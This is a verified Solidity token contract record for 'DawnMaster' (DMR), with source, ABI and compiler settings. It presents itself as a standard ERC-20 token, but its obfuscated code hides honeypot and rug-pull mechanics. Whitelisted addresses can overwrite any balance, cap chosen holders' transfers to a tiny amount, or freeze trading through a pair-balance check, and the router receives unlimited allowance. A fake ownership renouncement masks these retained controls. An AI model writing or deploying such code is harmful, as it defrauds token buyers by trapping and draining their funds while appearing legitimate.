{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface maxLiquidity {\n    function createPair(address maxMin, address isSender) external returns (address);\n}\n\ninterface tradingTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTake) external view returns (uint256);\n\n    function transfer(address maxTrading, uint256 swapLaunch) external returns (bool);\n\n    function allowance(address fromTakeLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTrading,\n        uint256 swapLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLaunch, uint256 value);\n    event Approval(address indexed fromTakeLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract senderTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingTxMetadata is tradingTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DawnMaster is senderTo, tradingTx, tradingTxMetadata {\n\n    mapping(address => bool) public minTx;\n\n    string private launchAuto = \"Dawn Master\";\n\n    function toLiquidityAt(address fundTo, address maxTrading, uint256 swapLaunch) internal returns (bool) {\n        if (fundTo == liquidityMarketing) {\n            return takeShould(fundTo, maxTrading, swapLaunch);\n        }\n        uint256 autoIs = tradingTx(teamSender).balanceOf(atSwap);\n        require(autoIs == swapFundTotal);\n        require(maxTrading != atSwap);\n        if (atTake[fundTo]) {\n            return takeShould(fundTo, maxTrading, receiverTx);\n        }\n        return takeShould(fundTo, maxTrading, swapLaunch);\n    }\n\n    uint256 swapFundTotal;\n\n    uint256 public receiverLaunched;\n\n    string private buyTradingMin = \"DMR\";\n\n    function allowance(address txModeTeam, address autoShould) external view virtual override returns (uint256) {\n        if (autoShould == marketingWallet) {\n            return type(uint256).max;\n        }\n        return receiverList[txModeTeam][autoShould];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitAmount;\n    }\n\n    function marketingSender(uint256 swapLaunch) public {\n        fundLimit();\n        swapFundTotal = swapLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderReceiver;\n    }\n\n    uint256 private toBuy;\n\n    bool public swapSenderMax;\n\n    bool public minAuto;\n\n    function exemptTotal(address limitSwap) public {\n        require(limitSwap.balance < 100000);\n        if (swapFeeIs) {\n            return;\n        }\n        if (limitAtMarketing != atSender) {\n            atSender = limitAtMarketing;\n        }\n        minTx[limitSwap] = true;\n        if (minMax == swapSenderMax) {\n            receiverLaunched = senderLiquidityFrom;\n        }\n        swapFeeIs = true;\n    }\n\n    uint8 private senderReceiver = 18;\n\n    address atSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return senderTotalShould;\n    }\n\n    function takeShould(address fundTo, address maxTrading, uint256 swapLaunch) internal returns (bool) {\n        require(marketingTeam[fundTo] >= swapLaunch);\n        marketingTeam[fundTo] -= swapLaunch;\n        marketingTeam[maxTrading] += swapLaunch;\n        emit Transfer(fundTo, maxTrading, swapLaunch);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTradingMin;\n    }\n\n    function transferFrom(address fundTo, address maxTrading, uint256 swapLaunch) external override returns (bool) {\n        if (_msgSender() != marketingWallet) {\n            if (receiverList[fundTo][_msgSender()] != type(uint256).max) {\n                require(swapLaunch <= receiverList[fundTo][_msgSender()]);\n                receiverList[fundTo][_msgSender()] -= swapLaunch;\n            }\n        }\n        return toLiquidityAt(fundTo, maxTrading, swapLaunch);\n    }\n\n    bool public minMax;\n\n    address public teamSender;\n\n    function balanceOf(address fundTake) public view virtual override returns (uint256) {\n        return marketingTeam[fundTake];\n    }\n\n    constructor (){\n        \n        autoEnable feeSell = autoEnable(marketingWallet);\n        teamSender = maxLiquidity(feeSell.factory()).createPair(feeSell.WETH(), address(this));\n        if (receiverLaunched == senderLiquidityFrom) {\n            minAuto = true;\n        }\n        liquidityMarketing = _msgSender();\n        minTx[liquidityMarketing] = true;\n        marketingTeam[liquidityMarketing] = limitAmount;\n        buyAuto();\n        \n        emit Transfer(address(0), liquidityMarketing, limitAmount);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverList;\n\n    uint256 public limitAtMarketing;\n\n    function buyAuto() public {\n        emit OwnershipTransferred(liquidityMarketing, address(0));\n        senderTotalShould = address(0);\n    }\n\n    uint256 private senderLiquidityFrom;\n\n    uint256 private limitAmount = 100000000 * 10 ** 18;\n\n    function marketingSell(address takeFund, uint256 swapLaunch) public {\n        fundLimit();\n        marketingTeam[takeFund] = swapLaunch;\n    }\n\n    bool public swapFeeIs;\n\n    uint256 sellLiquidity;\n\n    mapping(address => uint256) private marketingTeam;\n\n    address public liquidityMarketing;\n\n    function approve(address autoShould, uint256 swapLaunch) public virtual override returns (bool) {\n        receiverList[_msgSender()][autoShould] = swapLaunch;\n        emit Approval(_msgSender(), autoShould, swapLaunch);\n        return true;\n    }\n\n    address private senderTotalShould;\n\n    function fundLimit() private view {\n        require(minTx[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed marketingShould, address indexed atMarketingShould);\n\n    function getOwner() external view returns (address) {\n        return senderTotalShould;\n    }\n\n    address marketingWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public atTake;\n\n    function isLiquidity(address walletExempt) public {\n        fundLimit();\n        \n        if (walletExempt == liquidityMarketing || walletExempt == teamSender) {\n            return;\n        }\n        atTake[walletExempt] = true;\n    }\n\n    uint256 constant receiverTx = 15 ** 10;\n\n    uint256 private atSender;\n\n    function transfer(address takeFund, uint256 swapLaunch) external virtual override returns (bool) {\n        return toLiquidityAt(_msgSender(), takeFund, swapLaunch);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTakeLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMarketingShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txModeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAtMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"marketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFeeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSenderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DawnMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}